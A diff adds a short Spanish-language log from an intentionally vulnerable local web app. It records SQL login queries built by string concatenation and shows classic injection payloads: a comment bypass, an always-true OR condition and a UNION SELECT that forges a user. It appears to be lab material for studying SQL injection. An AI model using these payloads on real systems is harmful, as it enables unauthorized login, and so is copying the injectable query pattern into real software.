@@ -1,0 +1,9 @@
+VULNERABLE escuchando en http://localhost:3000
+Query ejecutada: SELECT * FROM users WHERE username = 'admin' --' AND password = 'x'
+Query ejecutada: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
+Query ejecutada: SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = ''
+Query ejecutada: SELECT * FROM users WHERE username = 'zzz' UNION SELECT 1,'hacker','x' -- ' AND password = 'x'
+Query ejecutada: SELECT * FROM users WHERE username = 'noexiste' AND password = 'wrong'
+Query ejecutada: SELECT * FROM users WHERE username = 'admin' --' AND password = 'x'
+Query ejecutada: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
+Query ejecutada: SELECT * FROM users WHERE username = 'zzz' UNION SELECT 1,'hacker','x' -- ' AND password = 'x'
